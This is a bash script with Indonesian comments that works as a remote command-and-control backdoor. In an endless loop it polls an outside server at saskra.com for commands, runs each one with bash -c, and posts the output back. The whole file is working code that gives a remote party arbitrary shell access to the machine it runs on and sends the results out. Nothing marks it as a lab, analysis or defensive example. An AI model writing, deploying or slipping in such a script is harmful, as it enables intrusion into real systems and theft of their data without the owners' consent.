#!/usr/bin/env bash

SECRET="MySecretKey"
SERVER="https://saskra.com/sh3lL1"

while true; do
    # 1. Ambil perintah dari server
    cmd=$(curl -s -X POST -d "token=$SECRET" "$SERVER/get_command_and_post_result.php")

    # Jika tidak ada perintah baru, tunggu 5 detik
    if [[ "$cmd" == "NO_COMMAND" ]]; then
        sleep 5
        continue
    fi

    # 2. Jalankan perintah
    echo "[INFO] Menjalankan perintah: $cmd"
    result=$(bash -c "$cmd" 2>&1)

    # 3. Kirim hasil kembali ke server
    curl -s -X POST -d "token=$SECRET" --data-urlencode "result=$result" "$SERVER/get_command_and_post_result.php" >/dev/null

    # Tunggu 5 detik sebelum cek lagi
    sleep 5
done
